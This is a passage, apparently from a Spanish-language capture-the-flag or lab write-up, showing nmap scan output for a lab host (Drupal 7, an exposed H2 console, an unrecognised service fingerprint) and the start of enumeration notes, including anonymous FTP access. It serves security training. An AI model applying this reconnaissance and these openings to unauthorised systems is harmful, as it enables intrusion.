-| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
-|_/LICENSE.txt /MAINTAINERS.txt
-|_http-generator: Drupal 7 <span class="o">(</span>http://drupal.org<span class="o">)</span>
-5435/tcp open  tcpwrapped
-8082/tcp open  http          H2 database http console
-|_http-title: H2 Console
-9092/tcp open  XmlIpcRegSvc?
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port9092-TCP:V<span class="o">=</span>7.94SVN%I<span class="o">=</span>7%D<span class="o">=</span>7/2%Time<span class="o">=</span>6684889E%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>
-SF:NULL,45E,<span class="s2">"</span><span class="se">\0\0\0\0\0\0\0\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">009</span><span class="se">\x</span><span class="s2">000</span><span class="se">\x</span><span class="s2">001</span><span class="se">\x</span><span class="s2">001</span><span class="se">\x</span><span class="s2">007</span><span class="se">\0\0\0</span><span class="s2">F</span><span class="se">\0</span><span class="s2">R</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">m</span><span class="se">\0</span><span class="s2">
-SF:o</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">h</span><span class="se">\</span><span class="s2">
-SF:0i</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">l
-SF:</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">w</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">d</span><span class="se">\0</span><span class="s2">,</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">-</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">A</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">w</span><span class="se">\0</span><span class="s2">O</span><span class="se">\0</span><span class="s2">
-SF:t</span><span class="se">\0</span><span class="s2">h</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">s</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\0\x</span><span class="s2">01</span><span class="sb">`</span><span class="se">\x</span>05<span class="se">\0\0\x</span>01<span class="se">\x</span>d8<span class="se">\0</span>o<span class="se">\0</span>r<span class="se">\0</span>g<span class="se">\0\.\0</span>h<span class="se">\x</span>0
-SF:02<span class="se">\0\.\0</span>j<span class="se">\0</span>d<span class="se">\0</span>b<span class="se">\0</span>c<span class="se">\0\.\0</span>J<span class="se">\0</span>d<span class="se">\0</span>b<span class="se">\0</span>c<span class="se">\0</span>S<span class="se">\0</span>Q<span class="se">\0</span>L<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\</span>
-SF:0:<span class="se">\0\x</span>20<span class="se">\0</span>R<span class="se">\0</span>e<span class="se">\0</span>m<span class="se">\0</span>o<span class="se">\0</span>t<span class="se">\0</span>e<span class="se">\0\x</span>20<span class="se">\0</span>c<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0</span>n<span class="se">\0</span>e<span class="se">\0</span>c<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0</span>s<span class="se">\0\x</span>20
-SF:<span class="se">\0</span>t<span class="se">\0</span>o<span class="se">\0\x</span>20<span class="se">\0</span>t<span class="se">\0</span>h<span class="se">\0</span>i<span class="se">\0</span>s<span class="se">\0\x</span>20<span class="se">\0</span>s<span class="se">\0</span>e<span class="se">\0</span>r<span class="se">\0</span>v<span class="se">\0</span>e<span class="se">\0</span>r<span class="se">\0\x</span>20<span class="se">\0</span>a<span class="se">\0</span>r<span class="se">\0</span>e<span class="se">\0\x</span>20<span class="se">\0</span>
-SF:n<span class="se">\0</span>o<span class="se">\0</span>t<span class="se">\0\x</span>20<span class="se">\0</span>a<span class="se">\0</span>l<span class="se">\0</span>l<span class="se">\0</span>o<span class="se">\0</span>w<span class="se">\0</span>e<span class="se">\0</span>d<span class="se">\0</span>,<span class="se">\0\x</span>20<span class="se">\0</span>s<span class="se">\0</span>e<span class="se">\0</span>e<span class="se">\0\x</span>20<span class="se">\0</span>-<span class="se">\0</span>t<span class="se">\0</span>c<span class="se">\0</span>p<span class="se">\</span>
-SF:0A<span class="se">\0</span>l<span class="se">\0</span>l<span class="se">\0</span>o<span class="se">\0</span>w<span class="se">\0</span>O<span class="se">\0</span>t<span class="se">\0</span>h<span class="se">\0</span>e<span class="se">\0</span>r<span class="se">\0</span>s<span class="se">\0\x</span>20<span class="se">\0\[\x</span>009<span class="se">\x</span>000<span class="se">\x</span>001<span class="se">\x</span>001<span class="se">\x</span>007<span class="se">\0</span>-<span class="se">\</span>
-SF:x001<span class="se">\x</span>009<span class="se">\x</span>006<span class="se">\0\]\0\n\0\t\0</span>a<span class="se">\0</span>t<span class="se">\0\x</span>20<span class="se">\0</span>o<span class="se">\0</span>r<span class="se">\0</span>g<span class="se">\0\.\0</span>h<span class="se">\x</span>002<span class="se">\0\.\0</span>m<span class="se">\0</span>e<span class="se">\0</span>
-SF:s<span class="se">\0</span>s<span class="se">\0</span>a<span class="se">\0</span>g<span class="se">\0</span>e<span class="se">\0\.\0</span>D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\.\0</span>g<span class="se">\0</span>e<span class="se">\0</span>t<span class="se">\0</span>J<span class="se">\0</span>d<span class="se">\0</span>
-SF:b<span class="se">\0</span>c<span class="se">\0</span>S<span class="se">\0</span>Q<span class="se">\0</span>L<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\(\0</span>D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i
-SF:<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\.\0</span>j<span class="se">\0</span>a<span class="se">\0</span>v<span class="se">\0</span>a<span class="se">\0</span>:<span class="se">\x</span>003<span class="se">\x</span>004<span class="se">\x</span>005<span class="se">\0\)\0\n\0\t\0</span>a<span class="se">\0</span>t<span class="se">\0\x</span>20<span class="se">\0</span>o<span class="se">\0</span>r<span class="se">\</span>
-SF:0g<span class="se">\0\.\0</span>h<span class="se">\x</span>002<span class="se">\0\.\0</span>m<span class="se">\0</span>e<span class="se">\0</span>s<span class="se">\0</span>s<span class="se">\0</span>a<span class="se">\0</span>g<span class="se">\0</span>e<span class="se">\0\.\0</span>D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\</span>
-SF:0o<span class="se">\0</span>n<span class="se">\0\.\0</span>g<span class="se">\0</span>e<span class="se">\0</span>t<span class="se">\0\(\0</span>D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\.\0</span>j<span class="se">\0</span>a<span class="se">\0</span>v<span class="se">\0</span>a
-SF:<span class="se">\0</span>:<span class="se">\x</span>001<span class="se">\x</span>007<span class="se">\x</span>009<span class="se">\0\)\0\n\0\t\0</span>a<span class="se">\0</span>t<span class="se">\0\x</span>20<span class="se">\0</span>o<span class="se">\0</span>r<span class="se">\0</span>g<span class="se">\0\.\0</span>h<span class="se">\x</span>002<span class="se">\0\.\0</span>m<span class="se">\</span>
-SF:0e<span class="se">\0</span>s<span class="se">\0</span>s<span class="se">\0</span>a<span class="se">\0</span>g<span class="se">\0</span>e<span class="se">\0\.\0</span>D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\.\0</span>g<span class="se">\0</span>e<span class="se">\0</span>t<span class="se">\0\(</span>
-SF:<span class="se">\0</span>D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\.\0</span>j<span class="se">\0</span>a<span class="se">\0</span>v<span class="se">\0</span>a<span class="se">\0</span>:<span class="se">\x</span>001<span class="se">\x</span>005<span class="se">\x</span>005<span class="se">\0\)</span>
-SF:<span class="se">\0\n\0\t\0</span>a<span class="se">\0</span>t<span class="se">\0\x</span>20<span class="se">\0</span>o<span class="se">\0</span>r<span class="se">\0</span>g<span class="se">\0\.\0</span>h<span class="se">\x</span>002<span class="se">\0\.\0</span>m<span class="se">\0</span>e<span class="se">\0</span>s<span class="se">\0</span>s<span class="se">\0</span>a<span class="se">\0</span>g<span class="se">\0</span>e<span class="se">\0\.\</span>
-SF:0D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\.\0</span>g<span class="se">\0</span>e<span class="se">\0</span>t<span class="se">\0\(\0</span>D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\</span>
-SF:0t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\.\0</span>j<span class="se">\0</span>a<span class="se">\0</span>v<span class="se">\0</span>a<span class="se">\0</span>:<span class="se">\x</span>001<span class="se">\x</span>004<span class="se">\x</span>004<span class="se">\0\)\0\n\0\t\0</span>a<span class="se">\0</span>t<span class="se">\0\x</span>20<span class="se">\0</span>
-SF:o<span class="se">\0</span>r<span class="s2">")%r(RTSPRequest,45E,"</span><span class="se">\0\0\0\0\0\0\0\x</span>05<span class="se">\x</span>009<span class="se">\x</span>000<span class="se">\x</span>001<span class="se">\x</span>001<span class="se">\x</span>007<span class="se">\0</span>
-SF:<span class="se">\0\0</span>F<span class="se">\0</span>R<span class="se">\0</span>e<span class="se">\0</span>m<span class="se">\0</span>o<span class="se">\0</span>t<span class="se">\0</span>e<span class="se">\0\x</span>20<span class="se">\0</span>c<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0</span>n<span class="se">\0</span>e<span class="se">\0</span>c<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0</span>s<span class="se">\0\x</span>20<span class="se">\0</span>t
-SF:<span class="se">\0</span>o<span class="se">\0\x</span>20<span class="se">\0</span>t<span class="se">\0</span>h<span class="se">\0</span>i<span class="se">\0</span>s<span class="se">\0\x</span>20<span class="se">\0</span>s<span class="se">\0</span>e<span class="se">\0</span>r<span class="se">\0</span>v<span class="se">\0</span>e<span class="se">\0</span>r<span class="se">\0\x</span>20<span class="se">\0</span>a<span class="se">\0</span>r<span class="se">\0</span>e<span class="se">\0\x</span>20<span class="se">\0</span>n<span class="se">\0</span>
-SF:o<span class="se">\0</span>t<span class="se">\0\x</span>20<span class="se">\0</span>a<span class="se">\0</span>l<span class="se">\0</span>l<span class="se">\0</span>o<span class="se">\0</span>w<span class="se">\0</span>e<span class="se">\0</span>d<span class="se">\0</span>,<span class="se">\0\x</span>20<span class="se">\0</span>s<span class="se">\0</span>e<span class="se">\0</span>e<span class="se">\0\x</span>20<span class="se">\0</span>-<span class="se">\0</span>t<span class="se">\0</span>c<span class="se">\0</span>p<span class="se">\0</span>A<span class="se">\</span>
-SF:0l<span class="se">\0</span>l<span class="se">\0</span>o<span class="se">\0</span>w<span class="se">\0</span>O<span class="se">\0</span>t<span class="se">\0</span>h<span class="se">\0</span>e<span class="se">\0</span>r<span class="se">\0</span>s<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\0\x</span>01<span class="sb">`</span><span class="se">\x</span><span class="s2">05</span><span class="se">\0\0\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">d8</span><span class="se">\0</span><span class="s2">o
-SF:</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0\.\0</span><span class="s2">h</span><span class="se">\x</span><span class="s2">002</span><span class="se">\0\.\0</span><span class="s2">j</span><span class="se">\0</span><span class="s2">d</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0\.\0</span><span class="s2">J</span><span class="se">\0</span><span class="s2">d</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">S</span><span class="se">\0</span><span class="s2">Q</span><span class="se">\0</span><span class="s2">L</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e
-SF:</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">:</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">R</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">m</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">
-SF:i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">h</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\</span><span class="s2">
-SF:0a</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">w</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">d</span><span class="se">\0</span><span class="s2">,</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\</span><span class="s2">
-SF:x20</span><span class="se">\0</span><span class="s2">-</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">A</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">w</span><span class="se">\0</span><span class="s2">O</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">h</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0\[\x</span><span class="s2">009</span><span class="se">\x</span><span class="s2">000</span><span class="se">\x</span><span class="s2">0
-SF:01</span><span class="se">\x</span><span class="s2">001</span><span class="se">\x</span><span class="s2">007</span><span class="se">\0</span><span class="s2">-</span><span class="se">\x</span><span class="s2">001</span><span class="se">\x</span><span class="s2">009</span><span class="se">\x</span><span class="s2">006</span><span class="se">\0\]\0\n\0\t\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0\.\0</span><span class="s2">h</span><span class="se">\</span><span class="s2">
-SF:x002</span><span class="se">\0\.\0</span><span class="s2">m</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\.\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\</span><span class="s2">
-SF:0g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">J</span><span class="se">\0</span><span class="s2">d</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">S</span><span class="se">\0</span><span class="s2">Q</span><span class="se">\0</span><span class="s2">L</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\(\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">
-SF:x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\0</span><span class="s2">j</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">:</span><span class="se">\x</span><span class="s2">003</span><span class="se">\x</span><span class="s2">004</span><span class="se">\x</span><span class="s2">005</span><span class="se">\0\)\0\n\0\t\0</span><span class="s2">a
-SF:</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0\.\0</span><span class="s2">h</span><span class="se">\x</span><span class="s2">002</span><span class="se">\0\.\0</span><span class="s2">m</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\.\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x
-SF:</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\(\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n
-SF:</span><span class="se">\0\.\0</span><span class="s2">j</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">:</span><span class="se">\x</span><span class="s2">001</span><span class="se">\x</span><span class="s2">007</span><span class="se">\x</span><span class="s2">009</span><span class="se">\0\)\0\n\0\t\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0\.</span><span class="s2">
-SF:</span><span class="se">\0</span><span class="s2">h</span><span class="se">\x</span><span class="s2">002</span><span class="se">\0\.\0</span><span class="s2">m</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\.\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\</span><span class="s2">
-SF:0</span><span class="se">\.\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\(\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\0</span><span class="s2">j</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">:</span><span class="se">\x</span><span class="s2">0
-SF:01</span><span class="se">\x</span><span class="s2">005</span><span class="se">\x</span><span class="s2">005</span><span class="se">\0\)\0\n\0\t\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0\.\0</span><span class="s2">h</span><span class="se">\x</span><span class="s2">002</span><span class="se">\0\.\0</span><span class="s2">m</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">s</span><span class="se">\</span><span class="s2">
-SF:0s</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\.\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\(\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b
-SF:</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\0</span><span class="s2">j</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">:</span><span class="se">\x</span><span class="s2">001</span><span class="se">\x</span><span class="s2">004</span><span class="se">\x</span><span class="s2">004</span><span class="se">\0\)\0\n\0</span><span class="s2">
-SF:</span><span class="se">\t\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">r"</span><span class="o">)</span><span class="p">;</span>
-Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-</code></pre></div></div>
-
-<h2 id="enumeración">Enumeración</h2>
-
-<ul>
-  <li>El puerto 80 corre un servicio web el cual usa como gestor de contenido un Drupal de versión 7 <a href="https://www.drupal.org/drupal-7.0/es">https://www.drupal.org/drupal-7.0/es</a>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>80/tcp   open  http          Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
-|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
-|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
-| http-robots.txt: 36 disallowed entries <span class="o">(</span>15 shown<span class="o">)</span>
-| /includes/ /misc/ /modules/ /profiles/ /scripts/
-| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
-| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
-|_/LICENSE.txt /MAINTAINERS.txt
-|_http-generator: Drupal 7 <span class="o">(</span>http://drupal.org<span class="o">)</span>
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>El puerto 21 esta abierto y corre <code class="language-plaintext highlighter-rouge">FTP</code> el cual tiene habilitado el <code class="language-plaintext highlighter-rouge">FTP</code> Anonymous el cual quiere decir que podemos habilitarnos sin necesidad de proporcionar contraseña.</p>
-  </li>
-  <li>
